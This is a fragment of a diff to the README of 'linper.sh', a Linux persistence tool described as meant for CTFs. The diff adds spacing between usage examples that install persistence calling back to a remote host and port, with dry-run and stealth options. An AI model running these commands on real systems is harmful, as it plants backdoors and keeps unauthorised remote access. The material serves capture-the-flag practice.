@@ -20,11 +20,13 @@ This was developed with CTFs in mind and that is its intended use case. The stea
 Enumerate all persistence methods and install
 
 `bash linper.sh --rhost 10.10.10.10 --rport 4444`
+
 `bash linper.sh -i 10.10.10.10 -p 4444`
 
 Enumerate and do not install
 
 `bash linper.sh --dryrun`
+
 `bash linper.sh -d`
 
 Enumerate all persistence methods and install (stealth mode)
